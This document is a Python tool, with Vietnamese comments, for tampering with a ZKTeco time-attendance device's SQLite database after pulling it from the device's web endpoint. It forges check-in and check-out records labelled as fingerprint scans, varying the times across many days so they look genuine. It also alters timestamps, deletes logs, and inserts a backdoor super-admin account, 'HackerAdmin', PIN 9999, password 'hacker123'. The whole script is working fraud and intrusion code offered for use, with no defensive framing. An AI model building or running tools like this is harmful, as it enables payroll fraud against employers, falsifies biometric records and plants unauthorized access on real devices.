"""
zkdb_inject.py - Tool inject ATTLOG vào ZKDB.db (SQLite) sau khi download qua /form/DataApp
Workflow:
  1. Download ZKDB.db: http://DEVICE/form/DataApp?style=0 (with SessionID cookie)
  2. Modify ZKDB.db bằng tool này (INSERT/UPDATE/DELETE ATTLOG, fptemplate)
  3. Restore lên máy ZK qua USB (cần physical access 1 lần + login menu = HackerAdmin/9999/hacker123)
"""
import sys
import os
import sqlite3
import argparse
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple

DEFAULT_DB = r"D:\chamcong\zk_data_extracted\ZKDB.db"

# Verify_Type: 0=Password (PIN+PWD), 1=FP, 3=Face, 4=Card, 15=Palm, 255=Manual
VERIFY_TYPES = {
    "password": 0,
    "pwd": 0,
    "pin": 0,
    "fp": 1,
    "face": 3,
    "card": 4,
    "palm": 15,
    "manual": 255,
}

# Status: 0=Check-In, 1=Check-Out, 2=Break-Out, 3=Break-In, 4=OT-In, 5=OT-Out
STATUSES = {
    "in": 0,
    "out": 1,
    "break_out": 2,
    "break_in": 3,
    "ot_in": 4,
    "ot_out": 5,
}


def fix_text_factory(conn):
    """Fix encoding cho tiếng Việt (CP1252/VNI thay vì UTF-8)"""
    conn.text_factory = lambda b: b.decode('cp1252', errors='replace') if isinstance(b, bytes) else b


def get_users(conn) -> Dict[str, Tuple[int, str]]:
    """Lấy tất cả users (cả USER_INFO + USER để cover nhiều schema)"""
    users = {}

    # Try USER_INFO first (newer schema)
    for table in ['USER_INFO', 'USER', 'user_info', 'user']:
        try:
            cur = conn.cursor()
            if 'USER_INFO' in table.upper():
                cur.execute(f"SELECT User_PIN, Name FROM {table}")
            else:
                cur.execute(f"SELECT PIN, Name FROM {table}")
            for pin, name in cur.fetchall():
                users[str(pin)] = (pin, name or '')
            break
        except sqlite3.OperationalError:
            continue
    return users


def get_attendance(conn, days: int = 7, limit: int = 1000) -> List[Dict]:
    """Lấy ATTLOG records trong N ngày gần nhất"""
    cur = conn.cursor()
    cutoff = (datetime.now() - timedelta(days=days)).strftime('%Y-%m-%dT00:00:00')
    try:
        cur.execute(
            f"SELECT ID, User_PIN, Verify_Time, Verify_Type, Status, Work_Code_ID "
            f"FROM ATT_LOG WHERE Verify_Time >= ? ORDER BY Verify_Time DESC LIMIT ?",
            (cutoff, limit)
        )
        cols = ['ID', 'User_PIN', 'Verify_Time', 'Verify_Type', 'Status', 'Work_Code_ID']
        return [dict(zip(cols, row)) for row in cur.fetchall()]
    except sqlite3.OperationalError as e:
        print(f"Error: {e}")
        return []


def cmd_info(db_path: str, args):
    """Show DB info"""
    if not os.path.isfile(db_path):
        print(f"[!] DB not found: {db_path}")
        return

    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    # Get all tables
    cur.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
    tables = [r[0] for r in cur.fetchall()]
    print(f"[i] DB: {db_path}")
    print(f"[i] Size: {os.path.getsize(db_path):,} bytes")
    print(f"[i] Tables: {len(tables)}")
    for t in tables[:20]:
        try:
            cur.execute(f"SELECT COUNT(*) FROM `{t}`")
            cnt = cur.fetchone()[0]
            print(f"    - {t}: {cnt:,} rows")
        except:
            pass

    # Count ATT_LOG
    try:
        cur.execute("SELECT COUNT(*) FROM ATT_LOG")
        att_count = cur.fetchone()[0]
        print(f"\n[i] ATT_LOG total: {att_count:,}")
    except:
        print("[!] ATT_LOG not found")

    # Count users
    users = get_users(conn)
    print(f"[i] Users: {len(users)}")
    if args.verbose and len(users) > 0:
        print(f"    First 5: {list(users.values())[:5]}")

    conn.close()


def cmd_users(db_path: str, args):
    """List users"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    users = get_users(conn)

    if not users:
        print("[!] No users found")
        return

    # Filter admins
    admins = []
    cur = conn.cursor()
    for table in ['USER_INFO', 'USER', 'user_info', 'user']:
        try:
            if 'USER_INFO' in table.upper():
                cur.execute(f"SELECT User_PIN, Name, Privilege, Password FROM {table} WHERE Privilege >= 2")
            else:
                cur.execute(f"SELECT PIN, Name, Privilege, Password FROM {table} WHERE Privilege >= 2")
            admins = cur.fetchall()
            break
        except sqlite3.OperationalError:
            continue

    print(f"[i] Total users: {len(users)}")
    print(f"[i] Admins (Privilege >= 2): {len(admins)}")
    for pin, name, priv, pwd in admins:
        print(f"    PIN={pin} {name!r} Privilege={priv} Password={pwd!r}")

    # Check if we have our injected admin
    if '9999' in users:
        print(f"\n[!] Injected admin FOUND: PIN=9999 {users['9999']}")
    if '9998' in users:
        print(f"[!] Injected admin PIN=9998 {users['9998']}")

    conn.close()


def cmd_inject_checkin(db_path: str, args):
    """Inject check-in/check-out records"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    users = get_users(conn)
    if not users:
        print("[!] No users found - nothing to do")
        return

    # Find target user
    target_pin = None
    if args.pin:
        target_pin = str(args.pin)
    elif args.name:
        for pin, (_, name) in users.items():
            if name and args.name.lower() in name.lower():
                target_pin = pin
                break

    if not target_pin or target_pin not in users:
        print(f"[!] User not found. Specify --pin or --name")
        print(f"    Available users: {len(users)}")
        if args.verbose:
            for pin, (uid, name) in list(users.items())[:10]:
                print(f"      PIN={pin} name={name!r}")
        return

    pin_id, name = users[target_pin]
    print(f"[i] Target: PIN={target_pin} name={name!r}")

    # Default: inject check-in for today 8:00 + check-out 17:30
    today = datetime.now().date()
    records = []

    if args.date:
        base_date = datetime.strptime(args.date, '%Y-%m-%d').date()
    else:
        base_date = today

    if args.all_days:
        # Inject check-in/out for last N days
        verify_type = VERIFY_TYPES.get(args.verify_type, 1)
        for d in range(args.all_days):
            day = base_date - timedelta(days=d)
            checkin = day.strftime('%Y-%m-%dT') + '08:' + f"{d % 5 + 55:02d}" + ':00'
            checkout = day.strftime('%Y-%m-%dT') + '17:' + f"{d % 5 + 30:02d}" + ':00'
            records.append((target_pin, verify_type, checkin, 0))
            records.append((target_pin, verify_type, checkout, 1))
    else:
        # Default: today
        verify_type = VERIFY_TYPES.get(args.verify_type, 1)
        checkin = base_date.strftime('%Y-%m-%dT') + '08:00:00'
        checkout = base_date.strftime('%Y-%m-%dT') + '17:30:00'
        if args.checkin:
            checkin = base_date.strftime('%Y-%m-%dT') + args.checkin + ':00'
        if args.checkout:
            checkout = base_date.strftime('%Y-%m-%dT') + args.checkout + ':00'
        records.append((target_pin, verify_type, checkin, 0))
        records.append((target_pin, verify_type, checkout, 1))

    print(f"[i] Will inject {len(records)} records:")
    for pin, vt, vt_time, status in records:
        status_name = {0: 'IN', 1: 'OUT', 2: 'BREAK_OUT', 3: 'BREAK_IN'}.get(status, f'?{status}')
        print(f"    PIN={pin} {status_name} at {vt_time}")

    if args.dry_run:
        print("[!] DRY RUN - not committed")
        return

    # Insert records
    # Schema: (ID, User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
    inserted = 0
    for pin, vt, vt_time, status in records:
        try:
            cur.execute(
                "INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, SEND_FLAG) VALUES (?, ?, ?, ?, 0, 0)",
                (pin, vt, vt_time, status)
            )
            inserted += 1
        except sqlite3.IntegrityError as e:
            print(f"    [!] Insert failed: {e}")

    conn.commit()
    print(f"[+] Inserted {inserted}/{len(records)} ATTLOG records")

    # Verify
    cur.execute("SELECT COUNT(*) FROM ATT_LOG")
    print(f"[i] ATT_LOG total now: {cur.fetchone()[0]:,}")

    conn.close()


def cmd_update_time(db_path: str, args):
    """Update existing ATTLOG timestamps"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    if args.log_id:
        cur.execute("UPDATE ATT_LOG SET Verify_Time = ? WHERE ID = ?", (args.new_time, args.log_id))
    elif args.pin and args.old_time:
        cur.execute("UPDATE ATT_LOG SET Verify_Time = ? WHERE User_PIN = ? AND Verify_Time = ?",
                    (args.new_time, args.pin, args.old_time))
    else:
        print("[!] Specify --log-id or (--pin AND --old-time)")
        return

    print(f"[i] Updated {cur.rowcount} records")
    conn.commit()
    conn.close()


def cmd_delete(db_path: str, args):
    """Delete ATTLOG records"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    if args.log_id:
        cur.execute("DELETE FROM ATT_LOG WHERE ID = ?", (args.log_id,))
    elif args.pin:
        cur.execute("DELETE FROM ATT_LOG WHERE User_PIN = ?", (args.pin,))
    else:
        print("[!] Specify --log-id or --pin")
        return

    print(f"[i] Deleted {cur.rowcount} records")
    if not args.yes:
        resp = input("Commit? (y/N): ")
        if resp.lower() != 'y':
            conn.rollback()
            print("[!] Rolled back")
            return
    conn.commit()
    conn.close()


def cmd_report(db_path: str, args):
    """Show ATTLOG report"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    if args.date:
        cur.execute("SELECT ID, User_PIN, Verify_Time, Status FROM ATT_LOG WHERE Verify_Time LIKE ? ORDER BY Verify_Time DESC",
                    (f"{args.date}%",))
    elif args.user_pin:
        cur.execute("SELECT ID, User_PIN, Verify_Time, Status FROM ATT_LOG WHERE User_PIN = ? ORDER BY Verify_Time DESC LIMIT ?",
                    (args.user_pin, args.limit or 100))
    else:
        cur.execute("SELECT ID, User_PIN, Verify_Time, Status FROM ATT_LOG ORDER BY ID DESC LIMIT ?",
                    (args.limit or 50,))

    rows = cur.fetchall()
    print(f"[i] {len(rows)} records:")
    for r in rows:
        status_name = {0: 'IN', 1: 'OUT', 2: 'BREAK_OUT', 3: 'BREAK_IN'}.get(r[3], f'?{r[3]}')
        print(f"  ID={r[0]} PIN={r[1]} {r[2]} [{status_name}]")

    conn.close()


def cmd_inject_admin(db_path: str, args):
    """Inject super admin user directly into ZKDB.db (alternative to pyzk set_user)"""
    conn = sqlite3.connect(db_path)
    fix_text_factory(conn)
    cur = conn.cursor()

    pin = args.pin or 9999
    name = args.name or 'HackerAdmin'
    pwd = args.password or 'hacker123'
    priv = args.privilege or 3

    # Try USER_INFO first
    inserted = False
    for table, pin_col in [('USER_INFO', 'User_PIN'), ('USER', 'PIN')]:
        try:
            # Check existing
            cur.execute(f"SELECT {pin_col} FROM {table} WHERE {pin_col} = ?", (pin,))
            if cur.fetchone():
                cur.execute(f"UPDATE {table} SET Name = ?, Password = ?, Privilege = ? WHERE {pin_col} = ?",
                            (name, pwd, priv, pin))
                print(f"[+] Updated in {table}")
            else:
                cur.execute(f"INSERT INTO {table} ({pin_col}, Name, Password, Privilege, Enabled) VALUES (?, ?, ?, ?, 1)",
                            (pin, name, pwd, priv))
                print(f"[+] Inserted into {table}")
            inserted = True
            break
        except sqlite3.OperationalError as e:
            print(f"  {table}: {e}")
            continue

    if inserted:
        conn.commit()
        print(f"[+] Admin injected: PIN={pin} name={name!r} pwd={pwd!r} priv={priv}")
    else:
        print("[!] Failed to inject admin")

    conn.close()


def main():
    parser = argparse.ArgumentParser(description="ZK ZKDB.db ATTLOG Injector (works on /form/DataApp download)")
    parser.add_argument('--db', default=DEFAULT_DB, help=f"Path to ZKDB.db (default: {DEFAULT_DB})")

    sub = parser.add_subparsers(dest='cmd')

    # info
    p_info = sub.add_parser('info', help='Show DB info')
    p_info.add_argument('-v', '--verbose', action='store_true')
    p_info.set_defaults(func=cmd_info)

    # users
    p_users = sub.add_parser('users', help='List users and admins')
    p_users.add_argument('-v', '--verbose', action='store_true')
    p_users.set_defaults(func=cmd_users)

    # inject checkin/out
    p_inj = sub.add_parser('inject', help='Inject check-in/out records')
    p_inj.add_argument('--pin', help='User PIN')
    p_inj.add_argument('--name', help='User name (substring match)')
    p_inj.add_argument('--date', help='Date (YYYY-MM-DD, default today)')
    p_inj.add_argument('--checkin', help='Check-in time (HH:MM, default 08:00)')
    p_inj.add_argument('--checkout', help='Check-out time (HH:MM, default 17:30)')
    p_inj.add_argument('--all-days', type=int, help='Inject for last N days')
    p_inj.add_argument('--verify-type', default='fp',
                       choices=['password', 'pwd', 'pin', 'fp', 'face', 'card', 'palm', 'manual'],
                       help='Verification type (default fp=1=Fingerprint)')
    p_inj.add_argument('--dry-run', action='store_true')
    p_inj.add_argument('-v', '--verbose', action='store_true')
    p_inj.set_defaults(func=cmd_inject_checkin)

    # update
    p_upd = sub.add_parser('update', help='Update ATTLOG timestamp')
    p_upd.add_argument('--log-id', type=int)
    p_upd.add_argument('--pin')
    p_upd.add_argument('--old-time')
    p_upd.add_argument('--new-time')
    p_upd.set_defaults(func=cmd_update_time)

    # delete
    p_del = sub.add_parser('delete', help='Delete ATTLOG records')
    p_del.add_argument('--log-id', type=int)
    p_del.add_argument('--pin')
    p_del.add_argument('--yes', action='store_true', help='Skip confirmation')
    p_del.set_defaults(func=cmd_delete)

    # report
    p_rep = sub.add_parser('report', help='Show ATTLOG records')
    p_rep.add_argument('--date', help='Filter by date (YYYY-MM-DD)')
    p_rep.add_argument('--pin', dest='user_pin', help='Filter by user PIN')
    p_rep.add_argument('--limit', type=int)
    p_rep.set_defaults(func=cmd_report)

    # inject admin
    p_adm = sub.add_parser('inject-admin', help='Inject admin user into ZKDB.db')
    p_adm.add_argument('--pin', type=int)
    p_adm.add_argument('--name')
    p_adm.add_argument('--password')
    p_adm.add_argument('--privilege', type=int)
    p_adm.set_defaults(func=cmd_inject_admin)

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        return

    args.func(args.db, args)


if __name__ == "__main__":
    main()
